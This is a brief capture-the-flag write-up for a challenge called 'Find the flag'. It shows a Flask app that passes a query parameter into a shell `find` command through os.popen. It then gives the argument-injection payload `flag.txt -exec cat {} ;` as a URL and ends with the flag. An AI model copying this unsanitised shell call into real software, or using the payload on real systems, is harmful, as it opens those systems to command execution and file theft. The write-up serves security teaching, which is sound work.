# Find the flag

**Description**: Flag is in flag.txt<br>
**Author:  [Av4nth1ka](https://twitter.com/av4nth1ka)**<br>

**Solution**: 
This challenge is basically Arguement injection using find command. We are given with the main.py:<br>
```py
import os

from flask import Flask, request, render_template

app = Flask(__name__)

@app.get('/')
def index():
    test = request.args.get('test', None)
    if test is None:
        return render_template('index.html')

    command = f"find {test}"

    try:
        output = os.popen(command).read()

    except Exception as e:
        output = f"Error: {str(e)}"

    return render_template('index.html', output=output)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

Intended payload for flag: `flag.txt -exec cat {} ;`<br>
`http://localhost:5000/?test=flag.txt%20-exec%20cat%20{}%20;`<br>

Flag: `shaktictf{finally_you found_the_flag_hehehheh!}`%   <br>         